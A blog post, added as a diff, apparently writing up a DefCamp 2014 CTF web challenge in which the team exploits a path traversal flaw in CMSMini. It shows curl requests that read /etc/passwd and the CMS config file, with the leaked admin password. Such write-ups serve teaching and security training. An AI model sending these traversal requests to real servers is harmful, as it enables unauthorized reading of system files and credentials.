@@ -1,0 +1,81 @@
+---
+layout: post
+title: "DefCamp 2014 Web 200"
+date: 2014-10-23 14:30:59 -0400
+author: [barrebas, swappage, superkojiman]
+comments: true
+categories: [defcamp]
+---
+
+### Solved by barrebas, Swappage, and superkojiman
+
+superkojiman here. Navigating to the provided IP address 10.13.37.12 on a web browser displayed an image of a rose with the text. barrebas did the inital enumeration and found a /cms/admin directory containing a login form
+
+![](/images/2014/defcamp/web200/01.png)
+
+After looking through the source code, we realized it was running CMSMini. Swappage found an exploit at [http://www.exploit-db.com/exploits/28128/](http://www.exploit-db.com/exploits/28128/) that allowed us to read local files on the server. Eg:
+
+```
+curl "http://10.13.37.12/cms/admin/edit.php?path=&name=../../../../../../etc/passwd"
+.
+.
+.
+<body>
+
+<table>
+  <tr>
+    <td>
+      <fieldset>
+        <legend>Edit page</legend>
+
+      <div class="formHelp">Page body</div>
+
+<form action="save.php?what=page&path=&p=../../../../../../etc/passwd" method="post">
+<textarea name="content" id="content" cols="80" rows="25">
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
+mysql:x:102:104:MySQL Server,,,:/nonexistent:/bin/false
+</textarea>
+<input type="submit" value="Save" />
+</form>
+
+</fieldset>
+    </td>
+
+    <td>
+      <fieldset>
+.
+.
+.
+```
+
+To get a better idea of what interesting files I could read, I downloaded a copy of cmsmini-0.2.2 and found a file called config.php. I was able to use the local file inclusion vulnerability to get the contents of the file which had the admin login and password:
+
+```
+curl "http://10.13.37.12/cms/admin/edit.php?path=&name=../../../../../../var/www/cms/admin/config.php"
+.
+.
+.
+$admin_login = 'admin';
+$admin_pass = 'RosesmaysayIloveyoubutthecactussaysFuckoff';
+```
+
+The admin_pass turned out to be the flag.
